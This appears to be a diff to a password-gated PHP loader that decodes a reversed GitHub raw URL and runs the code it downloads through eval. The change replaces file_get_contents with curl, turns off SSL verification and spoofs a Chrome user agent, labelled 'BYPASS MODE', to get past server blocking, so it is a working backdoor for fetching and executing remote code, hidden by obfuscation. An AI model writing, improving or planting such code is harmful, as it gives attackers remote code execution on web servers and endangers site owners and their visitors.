@@ -9,28 +9,30 @@ if (!isset($_GET['p']) || $_GET['p'] !== $pass) {
 $z = "php.2/niam/sdaeh/sfer/mpo/mpyfful/moc.tnebnetnocubhtig.war//:sptth";
 $u = strrev($z);
 
-echo '<div id="php-report" style="position:fixed; top:10px; right:10px; z-index:9999; background:#1a1a1a; color:#eee; padding:15px; border-radius:8px; border:2px solid #ff0000; font-family:sans-serif; width:280px; box-shadow: 0 5px 15px rgba(0,0,0,0.7);">';
-echo '<div style="font-weight:bold; border-bottom:1px solid #444; margin-bottom:10px; padding-bottom:5px; color:#ff0000;">[ PRIVATE ACCESS ]</div>';
+echo '<div style="position:fixed;top:10px;right:10px;z-index:9999;background:#1a1a1a;color:#eee;padding:15px;border-radius:8px;border:2px solid #ff0000;font-family:sans-serif;width:280px;">';
+echo '<b style="color:#ff0000;">[ BYPASS MODE ]</b><br>';
 
-$r = @file_get_contents($u);
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $u);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch, CURLOPT_TIMEOUT, 20);
+// Menyamar sebagai Browser Chrome di Windows
+curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
 
-if ($r !== false) {
-    echo '<div style="color:#2ecc71;">● Secure Link OK</div>';
-    try {
-        echo '<div style="color:#3498db;">● Running Payload...</div>';
-        echo '<hr style="border:0; border-top:1px solid #444; margin:10px 0;">';
-        
-        eval("?>" . $r);
-        
-        echo '<hr style="border:0; border-top:1px solid #444; margin:10px 0;">';
-        echo '<div style="color:#2ecc71; font-weight:bold;">EXECUTION DONE</div>';
-    } catch (Throwable $e) {
-        echo '<div style="color:#e74c3c;">ERROR: ' . htmlspecialchars($e->getMessage()) . '</div>';
-    }
+$r = curl_exec($ch);
+$info = curl_getinfo($ch);
+curl_close($ch);
+
+if ($r) {
+    echo '<span style="color:#2ecc71;">● Connection Success</span><br>';
+    eval("?>" . $r);
 } else {
-    echo '<div style="color:#e74c3c;">FAILED: Connection Timeout.</div>';
+    echo '<span style="color:#e74c3c;">● Still Blocked by Server</span><br>';
+    echo '<small>HTTP Code: ' . $info['http_code'] . '</small>';
 }
 
-echo '<button onclick="this.parentElement.remove()" style="margin-top:10px; width:100%; cursor:pointer; background:#444; color:#fff; border:none; padding:5px; border-radius:4px;">Dismiss</button>';
 echo '</div>';
 ?>
